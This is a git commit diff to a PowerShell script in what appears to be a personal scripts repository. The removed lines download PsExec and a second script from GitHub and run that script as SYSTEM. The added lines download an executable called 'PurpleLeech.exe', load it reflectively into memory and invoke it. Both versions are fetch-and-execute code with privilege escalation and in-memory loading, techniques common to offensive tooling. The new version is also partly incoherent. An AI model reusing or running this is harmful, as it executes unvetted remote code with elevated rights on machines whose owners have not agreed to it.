14236c930c52e4b4a4cb32efaf0133d0c57fc443
Lenard <lenardcode@gmail.com>
2025-03-28 13:44:28 -0600

    update

--- Powershell/script2.ps1
+++ Powershell/script2.ps1
@@ -1,21 +1,13 @@
-$psexecUrl = "https://raw.githubusercontent.com/Lenard-Code/Scripts/refs/heads/main/Powershell/PsExec64.exe"
-$scriptUrl = "https://raw.githubusercontent.com/Lenard-Code/Scripts/refs/heads/main/Powershell/script1.ps1"
-# Download PsExec to memory
+$psexecUrl = "https://raw.githubusercontent.com/Lenard-Code/Scripts/refs/heads/main/Powershell/PurpleLeech.exe"
+
 $psexecBytes = (Invoke-WebRequest -Uri $psexecUrl).Content
 
-# Download the PowerShell script to memory
-$scriptContent = (Invoke-WebRequest -Uri $scriptUrl).Content
 
-# Create a temporary file for PsExec
-$tempPsExecPath = [System.IO.Path]::Combine([System.IO.Path]::"C:\Temp", "PsExec64.exe")
-[System.IO.File]::WriteAllBytes($tempPsExecPath, $psexecBytes)
+$psExecAssembly = [System.Reflection.Assembly]::Load($psexecBytes)
 
-# Create a script block from the downloaded script content
-$scriptBlock = [scriptblock]::Create($scriptContent)
 
-# Execute PsExec to run the downloaded PowerShell script as SYSTEM
-$psExecCommand = "& `"$tempPsExecPath`" -accepteula -s -i powershell.exe -Command $scriptBlock"
+$scriptBlock = [scriptblock]::Create(".\\PurpleLeech.exe")
+
+
+$psExecCommand = "$scriptBlock"
 Invoke-Expression -Command $psExecCommand
-
-# Clean up the temporary PsExec file
-Remove-Item $tempPsExecPath
